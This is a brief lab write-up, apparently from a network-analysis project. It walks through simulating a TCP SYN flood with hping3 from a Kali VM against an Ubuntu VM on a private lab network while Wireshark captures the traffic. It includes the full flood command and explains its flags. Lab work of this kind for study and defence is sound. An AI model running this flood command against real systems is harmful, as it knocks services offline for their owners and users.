# TCP SYN Flood – Attack Steps

This section documents the steps used to simulate a TCP SYN flood in the lab.

## Tool Used
- hping3

## Attacker and Target
- Attacker: Kali Linux (192.168.56.10)
- Target: Ubuntu (192.168.56.20)

## Step-by-Step Execution

### 1. Turn on Wireshark on ubuntu
- in Terminal on ubuntu Type: `Wireshark`.
- choose the network adapter and start monitoring

### 2. Verify Target Reachability
- Back on Kali Linux.\
`ping 192.168.56.20`\
Press `Ctrl + C` to stop packet transmission.

### 3. Launch TCP SYN Flood
`sudo hping3 -S --flood -p 80 192.168.56.20`

- `-S` → SYN flag
- `--flood` → high packet rate
- `-p 80` → target port

### 4. Stop the Attack
Press `Ctrl + C` to stop packet transmission.

### ScreenShot:
https://github.com/GorvBjaj/network-analysis-lab/blob/03224a75c1f1aa45bbea7b3bc9673469071d5790/screenshots/05-TCP-SYN-Flood-Command.png

## Notes
- Attack was executed only within the isolated lab network.
- No external systems were affected.
